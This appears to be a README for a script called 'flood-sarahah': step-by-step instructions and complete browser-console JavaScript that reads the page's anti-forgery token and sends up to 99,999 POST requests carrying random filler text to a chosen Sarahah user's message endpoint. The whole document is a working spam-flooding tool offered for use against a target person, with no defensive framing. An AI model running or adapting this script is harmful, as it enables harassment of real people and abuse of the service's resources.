# flood-sarahah

* Open the URL of the desired user
* Open browser inspection
* Paste the script
* Run the script (*`flood()`*)

```js
function flood(size) {
  function getRandomText() {
    var text = "";
    var s = "Mussum Ipsum, cacilds vidis litro abertis. A ordem dos tratores não altera o pão duris. Mé faiz elementum girarzis, nisi eros vermeio. Si num tem leite então bota uma pinga aí cumpadi! Viva Forevis aptent taciti sociosqu ad litora torquent. Aenean aliquam molestie leo, vitae iaculis nisl. Copo furadis é disculpa de bebadis, arcu quam euismod magna. Mais vale um bebadis conhecidiss, que um alcoolatra anonimis. Suco de cevadiss deixa as pessoas mais interessantis. Admodum accumsan disputationi eu sit. Vide electram sadipscing et per. Casamentiss faiz malandris se pirulitá. Atirei o pau no gatis, per gatis num morreus. Cevadis im ampola pa arma uma pindureta. Todo mundo vê os porris que eu tomo, mas ninguém vê os tombis que eu levo! Paisis, filhis, espiritis santis. Nec orci ornare consequat. Praesent lacinia ultrices consectetur. Sed non ipsum felis. Não sou faixa preta cumpadi, sou preto inteiris, inteiris. Interessantiss quisso pudia ce receita de bolis, mais bolis eu num gostis. Interagi no mé, cursus quis, vehicula ac nisi. Quem num gosta di mim que vai caçá sua turmis! Leite de capivaris, leite de mula manquis sem cabeça.";
    var possible = s.split(',');
    var length = Math.floor((Math.random()*50)+1);
    var lastWord = ""

    for( var i=0; i < length; i++ ) {
      var newWord = ""
      while (lastWord == newWord) {
        newWord = possible[(Math.floor(Math.random() * possible.length))] + " ";
      }

      lastWord = newWord;

      if ((text.length + newWord.length) <= 300) {
        text += newWord;
      } else {
        break;
      }
    }

    return text.charAt(0).toUpperCase() + text.slice(1);
  }

  size = Number(size) || 99999;
  var token = $('script:last').text().replace(/ /g, '').replace(/\n/g, '').replace(/.*value="/, '').replace(/".*/, '');
  for (var i = 0; i < size; i++) {
    var text = getRandomText();
    var userId = $('#RecipientId').val();
    console.log(i);
    $.ajax({
      url: '/Messages/SendMessage',
      type: 'POST',
      cache: false,
      data: {
        __RequestVerificationToken: token,
        userId: userId,
        text: text
      },
    });
  }
}
```
